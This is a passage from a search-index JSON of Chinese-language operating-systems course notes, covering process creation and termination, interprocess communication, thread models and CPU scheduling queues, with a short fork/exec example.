\u521b\u5efa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\nif (pid == 0) {\n    // \u5b50\u8fdb\u7a0b\u6267\u884c\u8fd9\u91cc\n    execlp(\"/bin/ls\", \"ls\", NULL);   // \u7528 ls \u7a0b\u5e8f\u66ff\u6362\u5f53\u524d\u5b50\u8fdb\u7a0b\n} else {\n    // \u7236\u8fdb\u7a0b\u6267\u884c\u8fd9\u91cc\n    wait(NULL);              // \u7b49\u5f85\u5b50\u8fdb\u7a0b\u7ed3\u675f\n}\n</code></pre> <p>\u6240\u8c13\u7684\u91cd\u7f6e\uff0c\u5176\u5b9e\u53ea\u590d\u4f4d\u4e86\u7528\u6237\u53ef\u89c1\u7684\u72b6\u6001\uff0cOS \u5185\u90e8\u7ef4\u62a4\u7684\u8fdb\u7a0b\u53f7\u3001\u76ee\u5f55\u3001\u6253\u5f00\u7684\u6587\u4ef6\u7b49\u4e0d\u53d8</p> <p>\u4e00\u4e2a\u8fdb\u7a0b\u7684\u521b\u5efa\u539f\u8bed\u4e3a\uff1a</p> <ol> <li>\u4e3a\u65b0\u8fdb\u7a0b\u5206\u914d\u4e00\u4e2a\u552f\u4e00\u7684\u8fdb\u7a0b\u6807\u8bc6\u53f7\uff0c\u5e76\u7533\u8bf7\u4e00\u4e2a\u7a7a\u767d PCB\u3002\u82e5 PCB \u7533\u8bf7\u5931\u8d25\uff0c\u5219\u521b\u5efa\u5931\u8d25\u3002</li> <li>\u4e3a\u8fdb\u7a0b\u5206\u914d\u5176\u8fd0\u884c\u6240\u9700\u8d44\u6e90\uff0c\u5305\u62ec\u5185\u5b58\u3001\u6587\u4ef6\u3001I/O\u8bbe\u5907\u548c CPU \u65f6\u95f4\u7b49\u3002\u8fd9\u4e9b\u8d44\u6e90\u53ef\u4ee5\u4ece\u64cd\u4f5c\u7cfb\u7edf\u6216\u7236\u8fdb\u7a0b\u4e2d\u83b7\u5f97\u3002</li> <li>\u521d\u59cb\u5316 PCB\u3002</li> <li>\u82e5\u8fdb\u7a0b\u5c31\u7eea\u961f\u5217\u6709\u7a7a\u4f4d\uff0c\u5219\u8fdb\u5165\uff0c\u7b49\u5f85\u88ab\u8c03\u5ea6\u8fd0\u884c\u3002</li> </ol>"},{"location":"Courses/OS/Topic3/#process-termination","title":"Process Termination","text":"<p>\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u6267\u884c\u6267\u884c\u5b8c\u540e\uff0c\u5b83\u4f1a\u8c03\u7528 <code>exit()</code> \u544a\u77e5 OS \u6765\u6e05\u7406\u8d44\u6e90\uff0c\u6b64\u65f6\u7236\u8fdb\u7a0b\u53ef\u4ee5\u901a\u8fc7 <code>wait()</code> \u6765\u83b7\u53d6\u8fd4\u56de\u503c\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u7236\u8fdb\u7a0b\u8fd8\u53ef\u4ee5\u4f7f\u7528 <code>abort()</code> \u4e3b\u52a8\u8ba9\u5b50\u8fdb\u7a0b\u7ec8\u6b62\uff0c\u5e38\u89c1\u539f\u56e0\u6709\uff1a</p> <ul> <li>\u5b50\u8fdb\u7a0b \u8d85\u51fa\u4e86\u5206\u914d\u7684\u8d44\u6e90\uff08\u6bd4\u5982\u7528\u592a\u591a\u5185\u5b58\u6216\u65f6\u95f4\uff09</li> <li>\u5b50\u8fdb\u7a0b \u4efb\u52a1\u4e0d\u518d\u9700\u8981\uff08\u6bd4\u5982\u7236\u8fdb\u7a0b\u53d1\u73b0\u5b83\u6ca1\u5fc5\u8981\u7ee7\u7eed\uff09</li> <li>\u6216\u8005 \u7236\u8fdb\u7a0b\u81ea\u5df1\u8981\u9000\u51fa\uff0c\u4e8e\u662f\u987a\u5e26\u8ba9\u5b50\u8fdb\u7a0b\u4e00\u5e76\u7ed3\u675f</li> </ul> <p>\u5b9e\u9645\u4e0a\uff0c\u901a\u8fc7 <code>fork()</code>, <code>exec()</code>, <code>exit()</code> \u8fd9\u4e09\u4e2a API \u5c31\u8db3\u4ee5\u5b9e\u73b0\u5927\u90e8\u5206\u8fdb\u7a0b\u8c03\u7528\u903b\u8f91</p> <p>\u4e00\u4e2a\u8fdb\u7a0b\u7684\u7ec8\u6b62\u539f\u8bed\u4e3a\uff1a</p> <ol> <li>\u6839\u636e\u88ab\u7ec8\u6b62\u8fdb\u7a0b\u7684\u6807\u8bc6\u7b26\uff0c\u68c0\u7d22\u51fa\u8be5\u8fdb\u7a0b\u7684 PCB\uff0c\u4ece\u4e2d\u8bfb\u53d6\u8be5\u8fdb\u7a0b\u7684\u72b6\u6001</li> <li>\u82e5\u88ab\u7ec8\u6b62\u8fdb\u7a0b\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\uff0c\u7acb\u5373\u7ec8\u6b62\u8be5\u8fdb\u7a0b\u7684\u6267\u884c\uff0c\u5c06 CPU \u8d44\u6e90\u5206\u914d\u7ed9\u5176\u5b83\u8fdb\u7a0b</li> <li>\u5c06\u8be5\u8fdb\u7a0b\u6240\u62e5\u6709\u7684\u5168\u90e8\u8d44\u6e90\u5f52\u8fd8\u7ed9\u5176\u7236\u8fdb\u7a0b\u6216\u64cd\u4f5c\u7cfb\u7edf</li> <li>\u5220\u9664\u8be5 PCB</li> </ol>"},{"location":"Courses/OS/Topic3/#communication","title":"Communication","text":"<p>Interprocess Communication\uff08IPC\uff09 \u662f\u8ba9\u4e0d\u540c\u8fdb\u7a0b\u4e4b\u95f4\u80fd\u591f\u4ea4\u6362\u4fe1\u606f\u3001\u534f\u540c\u5de5\u4f5c\u7684\u673a\u5236\uff0c\u5b83\u6709\u4e24\u4e2a\u57fa\u672c\u6a21\u578b\uff1a</p> <ul> <li>Message Passing\uff08\u6d88\u606f\u4f20\u9012\uff09\u6a21\u578b<ul> <li>\u5404\u8fdb\u7a0b\u4e0d\u5171\u4eab\u5185\u5b58\uff0c\u800c\u662f\u901a\u8fc7\u53d1\u9001(send) \u548c \u63a5\u6536(receive) \u6d88\u606f\u6765\u901a\u4fe1\u3002</li> <li>\u8fd9\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u6216\u5b89\u5168\u9694\u79bb\u7684\u73af\u5883\u4e2d\u7279\u522b\u5e38\u89c1\uff08\u4f8b\u5982\u4e24\u4e2a\u72ec\u7acb\u7684\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\uff09\u3002</li> <li>\u5e38\u89c1\u4f8b\u5b50\uff1aSocket \u901a\u4fe1\u3001\u7ba1\u9053\uff08pipe\uff09\u3001\u6d88\u606f\u961f\u5217\u3001RPC\u3002</li> </ul> </li> <li>Shared Memory\uff08\u5171\u4eab\u5185\u5b58\uff09\u6a21\u578b<ul> <li>\u8fdb\u7a0b\u95f4\u901a\u8fc7\u5171\u4eab\u4e00\u5757\u5185\u5b58\u533a\u57df\u6765\u901a\u4fe1\u3002</li> <li>\u5171\u4eab\u5185\u5b58\u6bd4\u6d88\u606f\u4f20\u9012\u5feb\uff0c\u56e0\u4e3a\u4e0d\u9700\u8981\u62f7\u8d1d\u6570\u636e\uff0c\u4f46\u9700\u8981\u540c\u6b65\u673a\u5236\uff08\u5982\u4fe1\u53f7\u91cf\uff09\u6765\u9632\u6b62\u6570\u636e\u51b2\u7a81\u3002</li> <li>\u4e00\u4e2a\u8fdb\u7a0b\u5185\u7684\u7ebf\u7a0b\u4e4b\u95f4\u662f\u81ea\u7136\u5171\u4eab\u8fdb\u7a0b\u7a7a\u95f4\u7684\uff0c\u4f46\u662f\u4e0d\u540c\u8fdb\u7a0b\u4e4b\u95f4\u662f\u72ec\u7acb\u7684\uff0c\u9700\u8981\u901a\u8fc7\u7279\u6b8a\u7684\u7cfb\u7edf\u8c03\u7528\u5b9e\u73b0</li> </ul> </li> </ul> <p></p> <p>\u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u5171\u4eab\u6587\u4ef6\u3001\u7ba1\u9053\uff08pipe\uff09\u3001Socket\uff08\u9002\u7528\u4e8e\u53cc\u65b9\u4e0d\u5728\u540c\u4e00\u4e2a\u8ba1\u7b97\u673a\uff09\u7b49\u8fdb\u7a0b\u95f4\u901a\u4fe1\u65b9\u5f0f\u3002</p>"},{"location":"Courses/OS/Topic3/#threads","title":"Threads","text":"<p>\u4e3a\u4e86\u51cf\u5c0f\u7a0b\u5e8f\u5728\u5e76\u53d1\u6267\u884c\u65f6\u6240\u4ed8\u51fa\u7684\u65f6\u7a7a\u5f00\u9500\uff0c\u63d0\u9ad8\u64cd\u4f5c\u7cfb\u7edf\u7684\u5e76\u53d1\u7cfb\u7edf\uff0c\u6211\u4eec\u5f15\u5165\u7ebf\u7a0b\uff08Thread\uff09\u8fd9\u4e00\u6982\u5ff5\u3002</p> <p>\u7ebf\u7a0b\u662f\u8fdb\u7a0b\u4e2d\u7684\u4e00\u4e2a\u5b9e\u4f53\uff0c\u662f\u88ab OS \u72ec\u7acb\u8c03\u5ea6\u548c\u5206\u6d3e\u7684\u57fa\u672c\u5355\u4f4d\u3002\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4e0e\u540c\u5c5e\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u7684\u5176\u5b83\u7ebf\u7a0b\u5171\u4eab\u8be5\u8fdb\u7a0b\u62e5\u6709\u7684\u5168\u90e8\u8d44\u6e90\uff0c\u540c\u4e00\u8fdb\u7a0b\u5185\u90e8\u7684\u591a\u4e2a\u7ebf\u7a0b\u4e4b\u95f4\u53ef\u4ee5\u5e76\u53d1\u6267\u884c\u3002</p> <p>\u5f15\u5165\u7ebf\u7a0b\u540e\uff0c\u8fdb\u7a0b\u53ea\u4f5c\u4e3a\u9664\u4e86 CPU \u5916\u7684\u7cfb\u7edf\u8d44\u6e90\u7684\u5206\u914d\u5355\u5143\uff0c\u800c\u7ebf\u7a0b\u5219\u4f5c\u4e3a CPU \u7684\u5206\u914d\u7684\u5206\u914d\u5355\u5143\u3002</p> \u8fdb\u7a0b\u548c\u7ebf\u7a0b\u7684\u6bd4\u8f83 <ul> <li>\u8c03\u5ea6\uff1a \u8fdb\u7a0b\u8c03\u5ea6\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u5f00\u9500\u8f83\u5927\uff0c\u800c\u7edf\u4e00\u8fdb\u7a0b\u5185\u7684\u7ebf\u7a0b\u5207\u6362\u4ee3\u4ef7\u8fdc\u4f4e\u4e8e\u8fdb\u7a0b</li> <li>\u5e76\u53d1\u6027\uff1a OS \u5f15\u5165\u7ebf\u7a0b\u540e\uff0c\u4e0d\u540c\u8fdb\u7a0b\u4e4b\u95f4\u3001\u4e00\u4e2a\u8fdb\u7a0b\u7684\u591a\u4e2a\u7ebf\u7a0b\u4e4b\u95f4\u3001\u4e0d\u540c\u8fdb\u7a0b\u7684\u7ebf\u7a0b\u4e4b\u95f4\u90fd\u80fd\u591f\u5e76\u53d1\u6267\u884c\uff0c\u4f7f\u5f97\u64cd\u4f5c\u7cfb\u7edf\u62e5\u6709\u66f4\u597d\u7684\u5e76\u53d1\u6027</li> <li>\u62e5\u6709\u8d44\u6e90\uff1a \u8fdb\u7a0b\u662f\u7cfb\u7edf\u4e2d\u62e5\u6709\u8d44\u6e90\u7684\u57fa\u672c\u5355\u4f4d\uff0c\u800c\u7ebf\u7a0b\u672c\u8eab\u53ea\u6709\u6781\u5c11\u80fd\u4fdd\u8bc1\u72ec\u7acb\u8fd0\u884c\u7684\u8d44\u6e90\u3002\u4f46\u662f\u540c\u4e00\u8fdb\u7a0b\u5185\u7684\u6240\u6709\u7ebf\u7a0b\u90fd\u5177\u6709\u76f8\u540c\u5730\u5740\u7a7a\u95f4\uff0c\u5373\u7ebf\u7a0b\u53ef\u4ee5\u8bbf\u95ee\u5176\u96b6\u5c5e\u8fdb\u7a0b\u7684\u7cfb\u7edf\u8d44\u6e90</li> <li>\u72ec\u7acb\u6027\uff1a \u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u62e5\u6709\u72ec\u7acb\u7684\u5730\u5740\u7a7a\u95f4\u548c\u8d44\u6e90\uff0c\u9664\u4e86\u5171\u4eab\u5168\u5c40\u53d8\u91cf\uff0c\u4e0d\u5141\u8bb8\u5176\u5b83\u8fdb\u7a0b\u8bbf\u95ee\u3002</li> <li>\u7cfb\u7edf\u5f00\u9500\uff1a \u521b\u5efa\u3001\u64a4\u9500\u8fdb\u7a0b\u65f6\u7cfb\u7edf\u90fd\u8981\u4e3a\u4e4b\u5206\u914d\u6216\u56de\u6536 PCB \u53ca\u5176\u5b83\u8d44\u6e90\uff0c\u5e76\u4e14\u8fdb\u7a0b\u5207\u6362\u8bbe\u8ba1\u5f00\u9500\u8f83\u5927\u7684\u4e0a\u4e0b\u6587\u5207\u6362\uff1b\u800c\u7ebf\u7a0b\u5207\u6362\u53ea\u9700\u8981\u4fdd\u5b58\u548c\u8bbe\u7f6e\u5c11\u91cf\u5bc4\u5b58\u5668\u5185\u5bb9\uff08Lab 2\u5185\u5bb9\uff09</li> </ul> <p>\u7ebf\u7a0b\u662f\u4e00\u4e2a\u8f7b\u91cf\u578b\u5b9e\u4f53\uff0c\u5b83\u4e0d\u62e5\u6709\u7cfb\u7edf\u8d44\u6e90\uff0c\u4f46\u662f\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u5e94\u8be5\u6709\u4e00\u4e2a\u552f\u4e00\u6807\u8bc6\u7b26\u548c\u4e00\u4e2a\u7ebf\u7a0b\u63a7\u5236\u5757\uff0c\u8bb0\u5f55\u7ebf\u7a0b\u6267\u884c\u7684\u5bc4\u5b58\u5668\u548c\u6808\u7b49\u72b6\u6001\u3002\u6362\u53e5\u8bdd\u8bb2\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u62e5\u6709\u81ea\u5df1\u7684 thread ID\uff0cPC\uff0cRegister Set \u548c Runtime Stack\uff0c\u800c\u4e00\u4e2a\u7ebf\u7a0b\u4e0e\u540c\u4e00\u8fdb\u7a0b\u4e0b\u7684\u5176\u5b83\u7ebf\u7a0b\u5171\u4eab code section\uff0cdata section\uff0cheap\uff0copen files \u4ee5\u53ca signals\u3002</p> <p>\u4e0e\u8fdb\u7a0b\u4e00\u6837\uff0c\u5404\u7ebf\u7a0b\u4e4b\u95f4\u4e5f\u5b58\u5728\u5171\u4eab\u8d44\u6e90\u548c\u76f8\u4e92\u5408\u4f5c\u7684\u5236\u7ea6\u5173\u7cfb\uff0c\u56e0\u6b64\u7ebf\u7a0b\u5728\u8fd0\u884c\u65f6\u4e5f\u5177\u6709 running\uff0cwaiting\uff0cready \u4e09\u79cd\u57fa\u672c\u72b6\u6001\u3002</p> <p>\u5728\u5b9e\u73b0\u4e0a\uff0c\u7ebf\u7a0b\u53ef\u5206\u4e3a User-Level Thread\uff08ULT\uff09 \u548c Kernel-Level Thread\uff08KLT\uff09 \u4e24\u7c7b\uff1a</p> <ul> <li>User-Level Thread \u7528\u6237\u7ea7\u7ebf\u7a0b\u4e2d\uff0c\u6709\u5173\u7ebf\u7a0b\u7ba1\u7406\u7684\u6240\u6709\u5de5\u4f5c\u90fd\u5728\u7528\u6237\u6001\u5b8c\u6210\uff0c\u5185\u6838\u610f\u8bc6\u4e0d\u5230\u7ebf\u7a0b\u7684\u5b58\u5728\u3002<ul> <li>\u7528\u6237\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u7528\u7ebf\u7a0b\u5e93\u8bbe\u8ba1\u6210\u591a\u7ebf\u7a0b\u7a0b\u5e8f\uff0c\u5bf9\u4e8e\u4f7f\u7528 ULT \u7684\u7cfb\u7edf\uff0c\u5176\u8c03\u5ea6\u4ecd\u7136\u4ee5\u8fdb\u7a0b\u4e3a\u5355\u4f4d</li> <li>Advantage 1: \u7ebf\u7a0b\u5207\u6362\u65e0\u9700\u8f6c\u6362\u5230\u5185\u6838\u6001\uff0c\u8282\u7701\u5f00\u9500</li> <li>Advantage 2: \u4e0d\u540c\u8fdb\u7a0b\u53ef\u6839\u636e\u81ea\u8eab\u9700\u8981\u8bbe\u8ba1\u4e0d\u540c\u7684\u8c03\u5ea6\u7b97\u6cd5</li> <li>Advantage 3: \u5b9e\u73b0\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u65e0\u5173\uff0c\u7ebf\u7a0b\u7ba1\u7406\u4ee3\u7801\u5c5e\u4e8e\u7528\u6237\u7a0b\u5e8f\u7684\u4e00\u90e8\u5206</li> <li>Disadvantage 1: \u5f53\u4e00\u4e2a\u7ebf\u7a0b\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u65f6\uff0c\u8fdb\u7a0b\u5185\u7684\u6240\u6709\u7ebf\u7a0b\u90fd\u88ab\u963b\u585e</li> <li>Disadvantage 2: \u5185\u6838\u6bcf\u6b21\u5206\u914d\u7ed9\u4e00\u4e2a\u8fdb\u7a0b\u53ea\u6709\u4e00\u4e2a CPU\uff0c\u56e0\u6b64\u540c\u4e00\u65f6\u523b\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u80fd\u6267\u884c</li> </ul> </li> <li>Kernel-Level Thread \u5185\u6838\u7ea7\u7ebf\u7a0b\u4e2d\uff0c\u6709\u5173\u7ebf\u7a0b\u7ba1\u7406\u7684\u6240\u6709\u5de5\u4f5c\u90fd\u5728\u5185\u6838\u6001\u5b8c\u6210<ul> <li>\u64cd\u4f5c\u7cfb\u7edf\u4e3a\u6bcf\u4e2a\u5185\u6838\u7ea7\u7ebf\u7a0b\u8bbe\u7f6e\u7ebf\u7a0b\u63a7\u5236\u5757 TCB\uff0c\u5176\u8c03\u5ea6\u4ee5\u7ebf\u7a0b\u4e3a\u5355\u4f4d</li> <li>Advantage 1: \u53d1\u6325\u591a CPU \u4f18\u52bf\uff0c\u5185\u6838\u80fd\u540c\u65f6\u8c03\u5ea6\u540c\u4e00\u8fdb\u7a0b\u4e2d\u591a\u4e2a\u7ebf\u7a0b\u5e76\u884c</li> <li>Advantage 2: \u82e5\u8fdb\u7a0b\u4e2d\u67d0\u4e00\u7ebf\u7a0b\u963b\u585e\uff0c\u5185\u6838\u53ef\u4ee5\u8c03\u5ea6\u8be5\u8fdb\u7a0b\u4e2d\u5176\u5b83\u7ebf\u7a0b\u5360\u7528 CPU</li> <li>Disadvantage 1: \u7ebf\u7a0b\u5207\u6362\u9700\u8981\u8f6c\u6362\u5230\u5185\u6838\u6001\uff0c\u5f00\u9500\u8f83\u5927</li> </ul> </li> </ul> <p>\u76ee\u524d\u4e3b\u8981\u4f7f\u7528\u7684\u7ebf\u7a0b\u5e93\u5305\u62ec POSIX Pthreads\uff0cWindows API\uff0cJava</p> <p>\u8bb8\u591a\u7cfb\u7edf\u90fd\u4f7f\u7528 ULT \u548c KLT \u7ec4\u5408\u7684\u65b9\u5f0f\u5b9e\u73b0\u591a\u7ebf\u7a0b\uff0c\u6839\u636e\u4e8c\u8005\u8fde\u63a5\u65b9\u5f0f\u7684\u4e0d\u540c\uff0c\u5f62\u6210\u5982\u4e0b\u4e09\u79cd\u4e0d\u540c\u7684\u591a\u7ebf\u7a0b\u6a21\u578b\u3002</p> <p>Many-to-One Model</p> <p>\u5c06\u591a\u4e2a\u7528\u6237\u7ea7\u7ebf\u7a0b\u6620\u5c04\u5230\u4e00\u4e2a\u5185\u6838\u7ea7\u7ebf\u7a0b\u3002\u64cd\u4f5c\u7cfb\u7edf\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u5206\u914d\u4e00\u4e2a\u5185\u6838\u7ea7\u7ebf\u7a0b\uff0c\u8be5\u8fdb\u7a0b\u4e2d\u7684\u6240\u6709\u7528\u6237\u7ea7\u7ebf\u7a0b\u90fd\u8fde\u63a5\u5230\u8be5\u5185\u6838\u7ea7\u7ebf\u7a0b\u4e2d\u3002</p> <p>\u7ebf\u7a0b\u7684\u8c03\u5ea6\u4e0e\u7ba1\u7406\u5728\u7528\u6237\u6001\u5b8c\u6210\uff0c\u4ec5\u5f53 ULT \u9700\u8981\u8bbf\u95ee\u5185\u6838\u65f6\uff0c\u624d\u5c06\u5176\u6620\u5c04\u5230 KLT \u4e0a\u3002\u540c\u4e00\u65f6\u523b\u53ea\u6709\u4e00\u4e2a ULT \u53ef\u4ee5\u6620\u5c04 KLT\uff0c\u56e0\u6b64\u4e00\u4e2a\u7ebf\u7a0b\u8bbf\u95ee\u5185\u6838\u65f6\u53d1\u751f\u963b\u585e\uff0c\u6574\u4e2a\u8fdb\u7a0b\u90fd\u4f1a\u88ab\u963b\u585e\uff0c\u5e76\u4e14\u591a\u4e2a ULT \u4e0d\u80fd\u540c\u65f6\u5728\u591a\u4e2a CPU \u4e0a\u8fd0\u884c\u3002</p> <p>\u672c\u8d28\u4e0a\uff0c\u8be5\u6a21\u578b\u548c\u53ea\u5b9e\u73b0 ULT \u65e0\u533a\u522b\u3002</p> <p>One-to-One Model</p> <p>\u5c06\u6bcf\u4e2a\u7528\u6237\u7ea7\u7ebf\u7a0b\u6620\u5c04\u5230\u4e00\u4e2a\u5185\u6838\u7ea7\u7ebf\u7a0b\u3002\u6bcf\u4e2a\u8fdb\u7a0b\u6709\u4e0e\u7528\u6237\u7ea7\u8fdb\u7a0b\u6570\u91cf\u76f8\u540c\u7684\u5185\u6838\u7ea7\u7ebf\u7a0b\uff0c\u7ebf\u7a0b\u5207\u6362\u7531\u5185\u6838\u5b8c\u6210\uff0c\u9700\u8981\u5207\u6362\u5230\u5185\u6838\u6001\u3002</p> <p>\u5f53\u4e00\u4e2a\u7ebf\u7a0b\u963b\u585e\u540e\uff0c\u5141\u8bb8\u8c03\u5ea6\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u8fd0\u884c\uff1b\u4f46\u6bcf\u521b\u5efa\u4e00\u4e2a\u7528\u6237\u7ebf\u7a0b\uff0c\u90fd\u9700\u8981\u76f8\u5e94\u521b\u5efa\u4e00\u4e2a\u5185\u6838\u7ebf\u7a0b\uff0c\u5f00\u9500\u8f83\u5927\u3002</p> <p>\u672c\u8d28\u4e0a\uff0c\u8be5\u6a21\u578b\u548c\u53ea\u5b9e\u73b0 KLT \u65e0\u533a\u522b\u3002</p> <p>Many-to-Many Model</p> <p>\u5c06 n \u4e2a\u7528\u6237\u7ea7\u7ebf\u7a0b\u6620\u5c04\u5230 m \u4e2a\u5185\u6838\u7ea7\u7ebf\u7a0b\uff0c\u5e76\u4e14\u4e00\u5b9a\u6709 \\(n\\ge m\\)\u3002</p> <p>\u65e2\u514b\u670d\u4e86\u591a\u5bf9\u4e00\u6a21\u578b\u5e76\u53d1\u5ea6\u4e0d\u9ad8\u7684\u7f3a\u70b9\uff0c\u53c8\u514b\u670d\u4e86\u4e00\u5bf9\u4e00\u6a21\u578b\u4e00\u4e2a\u8fdb\u7a0b\u5360\u7528\u592a\u591a\u5185\u6838\u7ea7\u7ebf\u7a0b\u7684\u7f3a\u70b9\u3002</p> <p></p>"},{"location":"Courses/OS/Topic3/#cpu-scheduling","title":"CPU Scheduling","text":""},{"location":"Courses/OS/Topic3/#concept_1","title":"Concept","text":"<p>\u200b\u591a\u9053 (multiprogramming)\u00a0\u73af\u5883\u4e0b\uff0c\u8fdb\u7a0b\u7684\u4e2a\u6570\u901a\u5e38\u5927\u4e8e CPU \u7684\u4e2a\u6570\u3002CPU \u8c03\u5ea6\u5c31\u662f OS \u5173\u4e8e\u54ea\u4e2a ready \u8fdb\u7a0b\u53ef\u4ee5\u8fd0\u884c\uff08\u4f7f\u7528 CPU\uff09\u4ee5\u53ca\u8fd0\u884c\u591a\u4e45\u7684\u51b3\u5b9a\u3002</p> <p>\u200b\u5176\u76ee\u6807\u662f\u59cb\u7ec8\u5141\u8bb8\u67d0\u4e2a\u8fdb\u7a0b\u8fd0\u884c\u4ee5\u6700\u5927\u5316 CPU \u5229\u7528\u7387\uff0c\u540c\u65f6\u4fdd\u8bc1\u4e00\u5b9a\u7684\u516c\u5e73\u6027\u3002\u8fd9\u5728\u591a\u9053\u73af\u5883\u4e0b\u662f\u5fc5\u8981\u7684\uff0c\u5173\u7cfb\u5230\u7cfb\u7edf\u7684\u6574\u4f53\u6548\u7387\u3002</p> <p>from 4 \u8c03\u5ea6 - \u54b8\u9c7c\u6684\u7684\u4ee3\u7801\u7a7a\u95f4</p> <p></p> <p>\u4e3a\u4e86\u8fdb\u884c\u8fdb\u7a0b\u7684\u8c03\u5ea6\uff0cOS \u7ef4\u62a4\u4e86\u4e09\u6761\u76f8\u5173\u7684 Scheduling Queues\uff1a</p> <ul> <li>Job queue: set of all processes in the system</li> <li>Ready queue: set of all processes in main memory, ready and waiting to execute</li> <li>Device queues: set of processes waiting for an I/O device<ul> <li>\u4e5f\u88ab\u79f0\u4e3a wait queues\uff0c\u7b49\u5f85\u961f\u5217</li> </ul> </li> </ul> <p>\u8fdb\u7a0b\u5728 ready \u72b6\u6001\u65f6\u9700\u8981\u7b49\u5f85 CPU \u8d44\u6e90\u7684\u6d3e\u53d1\uff1b\u5728 waiting \u72b6\u6001\u65f6\u9700\u8981\u7b49\u5f85\u5bf9\u5e94 I/O \u5b8c\u6210\u6216\u4e8b\u4ef6\u5b8c\u6210\u3002\u6211\u4eec\u901a\u5e38\u4f7f\u7528\u94fe\u8868\u4f5c\u4e3a\u6570\u636e\u7ed3\u6784\u5bf9 Ready Queue \u548c Wait Queue \u8fdb\u884c\u7ef4\u62a4\uff1a</p> <p></p> <p>\u5b9e\u9645\u4e0a\uff0c\u4e0d\u540c\u8fdb\u7a0b\u4f1a\u56e0\u4e3a\u4e0d\u540c\u7684\u65f6\u95f4\u800c\u7b49\u5f85\uff0c\u56e0\u6b64 Wait Queues \u5b9e\u9645\u4e0a\u5b58\u5728\u5f88\u591a\u6761\uff1b\u5728\u7ed3\u675f Waiting \u540e\uff0c\u8fdb\u7a0b\u5c31\u4f1a\u8fdb\u5165 Ready Queue\uff0c\u56e0\u6b64\u5b9e\u9645\u60c5\u51b5\u53ef\u80fd\u5982\u4e0b\uff1a</p> <p></p> <p>Scheduler \u662f\u4e00\u4e2a\u51b3\u5b9a\u54ea\u4e2a\u7a0b\u5e8f\u8be5\u6267\u884c\u7684\u7a0b\u5e8f\uff0c\u5b83\u5728\u591a\u8fdb\u7a0b\u7cfb\u7edf\u4e2d\u975e\u5e38\u5173\u952e\uff0c\u53ef\u4ee5\u5206\u4e3a Long-term Scheduler \u548c Short-term Scheduler\u3002</p> <ul> <li>\u957f\u671f\u8c03\u5ea6\u5668 (Long-term scheduler / Job scheduler)<ul> <li>\u51b3\u5b9a\u54ea\u4e9b\u4f5c\u4e1a/\u8fdb\u7a0b\u53ef\u4ee5\u8fdb\u5165\u5185\u5b58\uff0c\u653e\u8fdb\u5c31\u7eea\u961f\u5217 (ready queue)\u3002</li> <li>\u957f\u671f\u8c03\u5ea6\u5668\u63a7\u5236\u7cfb\u7edf\u4e2d\u540c\u65f6\u6709\u591a\u5c11\u4e2a\u8fdb\u7a0b\u5728\u7ade\u4e89 CPU\uff0c\u5982\u679c\u592a\u591a\u5219\u4f1a\u9020\u6210\u9891\u7e41\u7684\u5207\u6362\uff0c\u5bfc\u81f4\u6548\u7387\u4e0b\u964d\uff1b\u5982\u679c\u592a\u5c11\u5219 CPU \u53ef\u80fd\u7a7a\u95f2\uff0c\u6d6a\u8d39\u8d44\u6e90</li> <li>\u957f\u671f\u8c03\u5ea6\u5668\u901a\u5e38\u4f1a\u8ba9 I/O-bound Process \u548c CPU-bound Process \u6df7\u5408\u8fdb\u5165\u7cfb\u7edf\uff0c\u9632\u6b62 CPU \u6216 I/O \u5b50\u7cfb\u7edf\u957f\u671f\u7a7a\u95f2</li> </ul> </li> <li>\u77ed\u671f\u8c03\u5ea6\u5668 (Short-term scheduler / CPU scheduler)<ul> <li>\u51b3\u5b9a\u4e0b\u4e00\u4e2a\u7531 CPU \u6267\u884c\u7684\u8fdb\u7a0b\uff0c\u8d1f\u8d23\u4ece\u5c31\u7eea\u961f\u5217\u4e2d\u6311\u9009</li> <li>\u53d1\u751f\u9891\u7387\u5f88\u9ad8\uff08\u6beb\u79d2\u7ea7\uff09\uff0c\u9700\u8981\u6548\u7387\u6781\u9ad8\u3002</li> </ul> </li> </ul> <p>Medium Term Scheduler</p> <p>\u6709\u4e9b\u7cfb\u7edf\u5b58\u5728\u4e2d\u671f\u8c03\u5ea6\u5668\uff0c\u76ee\u7684\u662f\u63d0\u9ad8\u5185\u5b58\u5229\u7528\u7387\u548c\u7cfb\u7edf\u541e\u5410\u91cf\u3002\u4e3a\u6b64\uff0c\u5c06\u90a3\u4e9b\u6682\u65f6\u4e0d\u80fd\u8fd0\u884c\u7684\u8fdb\u7a0b\u8c03\u81f3\u5916\u5b58\u7b49\u5f85\uff0c\u6b64\u65f6\u79f0\u4e3a\u8fdb\u7a0b\u6302\u8d77\u3002</p> <p>\u5f53\u5b83\u4eec\u5df2\u7ecf\u5177\u5907\u8fd0\u884c\u6761\u4ef6\u4e14\u5185\u5b58\u4e2d\u6709\u7a7a\u95f2\u65f6\uff0c\u4e2d\u671f\u8c03\u5ea6\u5668\u51b3\u5b9a\u5c06\u5176\u91cd\u65b0\u8c03\u5165\u5185\u5b58\uff0c\u5e76\u4fee\u6539\u72b6\u6001\u4e3a Ready\uff0c\u52a0\u5165\u5c31\u7eea\u961f\u5217\u3002</p> <p>CPU 